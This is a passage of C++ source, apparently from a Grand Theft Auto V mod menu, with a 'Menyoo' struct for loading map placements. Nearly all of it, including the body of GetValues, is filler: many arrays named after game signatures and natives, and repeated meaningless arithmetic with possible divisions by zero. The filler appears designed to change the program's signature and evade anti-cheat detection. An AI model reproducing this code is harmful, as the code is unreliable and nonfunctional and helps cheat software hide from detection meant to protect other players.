			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("</SpoonerPlacements>");
		}
	}
	namespace Carregar
	{
		struct Menyoo
		{
			std::string Model;
			DWORD Hash;
			float PosX;
			float PosY;
			float PosZ;
			float RotX;
			float RotY;
			float RotZ;
		};
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		std::vector<std::string> GetValues(std::string Arquivo)
		{
			/*
			Exemplo:
			vector<string> A = Menyoo::Carregar::GetValues(".\\MapaMenyoo.xml");
			for (int i = 0; i <= Extern_Reader::Simple_TXT_file::GetVectorSize(Aa); i++)
			{
				cout << A[i] << endl;
			}
			*/

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
